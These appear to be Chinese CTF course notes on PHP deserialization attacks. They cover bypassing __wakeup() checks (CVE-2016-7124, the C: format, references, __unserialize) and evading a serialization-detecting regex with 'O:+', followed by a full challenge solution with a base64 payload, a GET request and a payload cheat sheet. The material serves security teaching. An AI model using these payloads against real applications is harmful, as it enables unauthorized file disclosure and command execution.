---
title: 绕过 __wakeup 与正则过滤
category: PHP反序列化/绕过
tags: [__wakeup, CVE-2016-7124, 属性数量不匹配, Serializable, C格式, base64, preg_match, O:+]
source: PHP 反序列化课程笔记
order: 7
---

## 一句话概括

题目的防线通常有两道：**`__wakeup()` 里的检查**（把被改过的属性重置回去）和**提交前的正则过滤**（拦住 `O:数字:` 这样的序列化特征）。两道都可以绕：前者用**属性数量不匹配 / `C:` 形式 / 引用 `&`**，后者用**插入 `+` 号**破坏正则的特征串。

## 原理

### 1. `__wakeup()` 为什么会成为「绕过目标」

`__wakeup()` 在 `unserialize()` **还原属性之后、返回对象之前**执行。所以常见写法是「在 `__wakeup` 里把敏感属性改回安全值」：

```php
function __wakeup() {
    if ($this->file != 'index.php') {
        $this->file = 'index.php';     // 把攻击者改过的值重置回去
    }
}
```

攻击者想绕过它，本质上是想达到「`__wakeup` 不执行」或「执行了也没用」。

### 2. 绕过手法总览

| 手法 | 原理 | 前提 | 版本要求 |
|---|---|---|---|
| **属性数量不匹配** | 声明属性个数 > 实际提供的个数，老版本直接跳过 `__wakeup` | 无 | **仅老版本**（CVE-2016-7124） |
| **`C:` 形式** | 用「自定义序列化」格式，走 `Serializable::unserialize()` 而**不是** `__wakeup()` | 该类实现了 `Serializable` 接口 | 通用（PHP 8.1 起 `Serializable` 被弃用） |
| **引用 `&`** | 让两个属性互为引用，`__wakeup` 改了一个，另一个跟着变 | 无 | 通用 |
| **`__unserialize()` 顶替** | 类里定义了 `__unserialize()`，`__wakeup()` 永久失效 | 类里两个都写了 | PHP 7.4+ |
| **属性个数写成合法但不同** | 部分老版本对个数不敏感 | 无 | 版本相关 |

（更完整的「解析器宽容性」绕过见 08 篇）

### 3. 手法一：属性数量不匹配（CVE-2016-7124）

**现象**：在序列化字符串里把**属性个数写得比实际多**，老版本 PHP 会**跳过 `__wakeup()`**：

```text
O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
                 ↑ 声明 3 个属性，实际只给了 2 个（admin、passwd）
```

老版本的处理方式：正常反序列化能读到的属性，**忽略缺失的那些**，缺失的属性保持默认值，并且**不调用 `__wakeup()`**。

```text
现象：O:6:"HaHaHa":3:{ ... 只有 2 个属性 ... }   →  __wakeup 被跳过
用途：常用于「绕开 __wakeup 里的属性检查」
```

> **重要版本提醒**：这是 **CVE-2016-7124**，在 **PHP 5.6.25 / 7.0.10 之前**有效，之后已修复。在本机 **PHP 8.3** 上实测，这种「声明 3 个、只给 2 个」的写法会直接报：

```text
Warning: unserialize(): Unexpected end of serialized data
Warning: unserialize(): Error at offset 35 of 36 bytes
bool(false)
```

所以**现在再做这类题，不能只靠个数不匹配**，得换 `C:` 形式或引用 `&`。原笔记记录的是当年（PHP 7.x 题目环境）成功的写法。

### 4. 手法二：用 `C:` 形式替掉 `O:` 形式

PHP 的序列化除了 `O:`，还有 `C:`（自定义序列化）。**当对象的类实现了 `Serializable` 接口时**，`unserialize()` 会去调它的 `unserialize()` 方法，而**不会调用 `__wakeup()`**：

```php
<?php
class S implements Serializable {
    public $x = 'default';
    function serialize()        { return 'x=' . $this->x; }
    function unserialize($data) { $this->x = $data; }       // ← C: 走这里
    function __wakeup()         { echo "wakeup called\n"; } // ← 不会被调用
}
?>

<!-- 实测：C:1:"S":8:{x=hacked} -->
<!-- 输出： [S::unserialize called] data=x=hacked  —— 没有 wakeup -->
```

格式：

```text
C:类名长度:"类名":数据长度:{数据内容}
```

| 对比 | `O:` 形式 | `C:` 形式 |
|---|---|---|
| 二次格式 | 属性名/值列表 | 交给类的 `serialize()` 自己定义 |
| 触发 | `__wakeup()` | `Serializable::unserialize()` |
| `__wakeup` 检查 | 会执行 | **不执行** |

**所以 `C:` 天然就是一条 `__wakeup` 绕过通道**（前提：目标类实现了 `Serializable`）。注意 **PHP 8.1 起 `Serializable` 接口被弃用**，新代码用的是 `__serialize()` / `__unserialize()`。

### 5. 手法三：引用 `&`

如果 `__wakeup()` 会把某个属性重置掉，而**另一个属性是它的引用**，那么重置发生时引用双方一起变 —— 但这恰好也能被反向利用。最典型的用法是「让被重置的属性与我们要用的属性绑在一起」：

```php
$h = new test();
$h->b = &$h->a;     // b 成为 a 的引用
```

序列化出来会带 `R:`：

```text
O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:33:"system("cat /fffffffffflagafag");";}
                       ↑ b 的值是「引用第 2 个值」
```

`R:2` 的编号规则、以及完整的解题过程，见 **08 篇「引用」一节**（本手法留了交叉引用，因为它同时属于「序列化格式细节」）。

### 6. 手法四：`__unserialize()` 顶替 `__wakeup()`

PHP **7.4+** 的规则：

| 版本 | 反序列化时调用 |
|---|---|
| 7.3 及以前 | `__wakeup()` |
| 7.4+ | `__unserialize()`（优先级更高） |

**如果类里同时定义了 `__unserialize()` 和 `__wakeup()`，那么 `__wakeup()` 永远不会被调用**（这是语言机制，不是漏洞）。实测：

```php
class U {
    public $x;
    function __wakeup()        { echo "U::__wakeup\n"; }
    function __unserialize($d) { echo "U::__unserialize\n"; $this->x = $d['x'] ?? null; }
}
// unserialize('O:1:"U":1:{s:1:"x";i:7;}')
// 输出： U::__unserialize      （wakeup 没有出现）
```

`__wakeup()` 并没有「废掉」，只是**在定义了 `__unserialize()` 的类里永久让位**。

### 7. 正则过滤绕过：往数字前塞一个 `+`

过滤的目标通常是「序列化特征串」：

```php
if (preg_match('/[oc]:\d+:/i', $var)) {
    die('stop hacking!');
}
```

逐段拆这个正则：

| 部分 | 含义 |
|---|---|
| `/` … `/` | 分隔符 |
| `[oc]` | 匹配字母 `o` **或** `c` |
| `:` | 字面冒号 |
| `\d+` | **一个或多个数字** |
| `:` | 第二个字面冒号 |
| `i` | 不区分大小写（所以 `O:` 也会被匹配） |

它匹配的是**完整模式**「o/c : 数字 :」，四段**必须连在一起**。所以只要破坏其中一段，就能绕过：

```text
会被拦：O:4:"Demo":...        ← [o][:][4][:] 四段齐全
不会被拦：O:+4:"Demo":...     ← 数字前多了个 +，`\d+` 匹配不上
```

实测：

```text
preg_match('/[oc]:\d+:/i', 'O:4:"Demo":1:{}')   → 1（命中，拦）
preg_match('/[oc]:\d+:/i', 'O:+4:"Demo":2:{...}') → 0（未命中，放行）
```

**为什么 PHP 还认**：`unserialize()` 解析长度时**允许带正号**，`O:+4:` 与 `O:4:` 等价。所以「正则不认识、PHP 认识」这个错位就是绕过的全部。

> **版本提醒**：在本机 **PHP 8.3** 上实测 `O:+4:"Demo":...` 已被拒绝（`unserialize` 返回 `false`）。`+` 号宽容是 **PHP 7.x 时代**的行为，ctfshow / NSSCTF 那批题跑在 PHP 7.x 上，因此该绕过当年有效。

## 本题情景与解题手法

> 原笔记「正则绕过」一节给出的判例（`highlight_file` 读文件的模型）。

### 题目形态

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) { $this->file = $file; }
    function __destruct() {
        echo @highlight_file($this->file, true);      // ★ 出口：读文件
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            // the secret is in the fl4g.php
            $this->file = 'index.php';                // ★ 防线一：重置 file
        }
    }
}

if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);               // ★ 提交前要 base64
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');                         // ★ 防线二：正则过滤
    } else {
        @unserialize($var);                           // ★ 入口
    }
} else {
    highlight_file("index.php");
}
?>
```

### 第一步：找出口与入口

- **出口**：`__destruct()` 里的 `highlight_file($this->file, true)` —— `$file` 可控就能读任意文件；
- **入口**：`unserialize($var)`，`$var` 来自 `$_GET['var']`（经 `base64_decode`）。

目标很明确：让 `$file = 'fl4g.php'`（注释里直接写了文件名）。

### 第二步：识别两道防线

| 防线 | 位置 | 作用 |
|---|---|---|
| 正则 `/[oc]:\d+:/i` | `unserialize` 之前 | 拦掉 `O:数字:` 形式的序列化串 |
| `__wakeup()` | 反序列化之后 | 把 `$file` 重置回 `index.php` |

**两道都要绕**，只绕一道都不行。

### 第三步：绕正则 —— 长度前加 `+`

把 `O:4:` 写成 `O:+4:`：

```text
O:4:"Demo":...    → 被正则拦
O:+4:"Demo":...   → 正则不认，PHP 认
```

### 第四步：绕 `__wakeup` —— 让属性个数对不上

`$file` 是 **`private`** 属性，属性名要写成 `\0Demo\0file`（长度 = 1+4+1+4 = **10**）。把「属性个数」写成比实际多 1 个，即可在老版本上跳过 `__wakeup`：

```text
O:+4:"Demo":2:{s:10:"%00Demo%00file";s:8:"fl4g.php";}
             ↑ 声明 2 个属性，实际只给 1 个 → 跳过 __wakeup（老版本）
```

### 第五步：base64 编码后提交

因为源码先 `base64_decode($_GET['var'])`，所以要把上面那串（`%00` 要写成**真实的 NUL 字节**）先 base64：

```python
import base64
payload = b'O:+4:"Demo":2:{s:10:"\x00Demo\x00file";s:8:"fl4g.php";}'
print(base64.b64encode(payload).decode())
```

```http
GET /?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== HTTP/1.1
Host: 靶机地址
```

### 注入手法一句话总结

> **`O:+4:` 破坏正则特征串** + **属性个数写大 1 个跳过 `__wakeup`** → `private $file` 填成 `fl4g.php` → 整体 base64 后交给 `?var=` → `__destruct()` 里 `highlight_file()` 读出目标文件。

> 注意：本题的「个数不匹配」依赖老版本 PHP。若目标跑在 PHP 7.0.10+ / 现代版本上，改用 `C:` 形式或引用 `&`，或先探测目标 PHP 版本再决定打法。

## 利用条件

1. **`__wakeup()` 里确实有「重置属性」这类检查**（否则不用绕）；
2. **过滤发生在 `unserialize()` 之前**，且过滤用的是**固定特征串**（`O:数字:`、`%00`、`system` 等关键词）—— 特征越"死"，越容易被 `+`、十六进制、大小写等手法破坏；
3. **版本匹配**：`O:+` 与「个数不匹配」都需要 PHP 7.x 时代的行为；
4. **`C:` 形式要求目标类实现 `Serializable`**（PHP 8.1 起该接口被弃用）。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 绕「`[oc]:\d+:`」正则 | `O:+4:"Demo":...`（数字前加 `+`） |
| 绕 `__wakeup`（老版本） | 属性个数写大：`O:4:"Demo":2:{s:10:"\0Demo\0file";s:8:"fl4g.php";}` |
| 绕 `__wakeup`（`C:` 形式） | `C:1:"S":8:{x=hacked}`（类需实现 `Serializable`） |
| 绕 `__wakeup`（引用） | `s:1:"b";R:2;` —— 详见 08 篇 |
| 绕 `__wakeup`（`__unserialize`） | 类里定义了 `__unserialize()` 时，`__wakeup` 自动失效 |
| base64 包装 | `base64.b64encode(payload_with_real_NUL)` |

## 踩坑与备注

- **别把「老版本的宽容」当成通用规则**。`O:+4:` 与「属性个数不匹配」都在新版本上失效，本机 PHP 8.3 实测均返回 `false`。做老题时按题目环境的 PHP 版本判断。
- **`O:+4:` 里 `+` 的位置是「数字之前」**：`O:+4:` ✓；`O+4:`、`O:4+:` 都不对。
- **正则匹配的是完整模式**：`[oc]:\d+:` 必须四段连续。破坏任意一段都能过 —— 所以这是「往特征里塞一个不该有的字符」的思路，和 SQL 注入里用 `/**/` 打断关键字是同一类技巧。
- **`__wakeup()` 无参数**，`__unserialize($data)` **有参数**，写错会直接报致命错误，而不是「魔术方法没被调用」。
- **`Serializable` 已被弃用**（PHP 8.1+）：新环境里 `C:` 写法可能报弃用警告，且现代代码改用 `__serialize()` / `__unserialize()`；做题时以目标版本为准。
- **原笔记「绕过wakeup」一节只给了一个 `O:6:"HaHaHa":3:{...}` 的例子**，没有说明版本背景。本文已补上 CVE-2016-7124 的版本信息与现代版本的实测结果，以免被当作通用手法。
- **base64 之后 `%00` 不再需要百分号编码**：做了 base64 时，`\0` 用**真实 NUL 字节**（`\x00`）参与编码，而不是字符串 `%00`（那会变成 3 个字符 `%`、`0`、`0`，长度全错）。
